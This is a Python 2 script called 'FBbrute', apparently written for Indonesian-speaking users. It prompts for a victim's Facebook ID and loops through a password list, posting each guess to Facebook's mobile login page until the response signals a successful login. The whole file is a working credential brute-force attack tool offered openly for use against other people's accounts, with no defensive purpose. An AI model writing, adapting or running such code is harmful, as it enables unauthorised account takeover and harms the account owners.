import requests
import os
import sys
import time
import random
import mechanize


wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan


def runtxt(s):
        for newbie in s + '\n':
                sys.stdout.write(newbie)
                sys.stdout.flush()
                time.sleep(10. /500)

def txt(s):
        for newbie in s + '\n':
                sys.stdout.write(newbie)
                sys.stdout.flush()
                time.sleep(10. /100)

def Clear():
    os.system('clear')
    time.sleep(0.5)
Clear()
print " "
print " "
txt(W+'               assalamualaikum wr.wb...           ')
time.sleep(1.5)
print " "
runtxt(R+'  _____ ____  _                _        \033[90;1m# FBbrute')
runtxt(R+' |  ___| __ )| |__  _ __ _   _| |_ ___  \033[90;1m# Newbie')
runtxt(R+' | |_  |  _ \|  _ \|  __| | | | __/ _ \\ \033[90;1m# Gunakan')
runtxt(W+' |  _| | |_) | |_) | |  | |_| | ||  __/ \033[90;1m# Dgn bijak')
runtxt(W+' |_|   |____/|_.__/|_|   \__,_|\__\___| \033[90;1m# J4NC0K H3H3')
runtxt(wd+'                 Created by : B4ng Sanz      ')
print " "
txt('               ^_^ L  O  A  D  I  N  G ^_^          ')
time.sleep(2)
print " "
print R+"[!] \033[0;1m( \033[90;1mMasukkan ID/Username Korban \033[0;1m)"
email = raw_input(B+"[\033[0;1m+\033[34m] \033[0;1mMasukkan ID   \033[90;1m => \033[0;1m")
time.sleep(3)
print R+"[!] \033[0;1m( \033[90;1mTulis pass.txt \033[0;1m)"
password = raw_input(B+"[\033[0;1m+\033[34m] \033[0;1mKetik pass.txt \033[90;1m=> \033[0;1m")
print " "
print W+"[#]> Sedang CRACKING Cuy.."
url ='https://free.facebook.com/login.php'
ex = open('pass.txt', 'r').readlines()

for line in ex:
        password = line.strip()
        http = requests.post(url,data={'email':email,'pass':password,'login':'submit'})
        content = http.content
        if "Beranda" in content:
                print W+"[+] Cracker Succes..... \033[32m ",password
                sys.exit(2)
        else:
                print R+"[!] Password Invalid..... \033[0;1m ",password
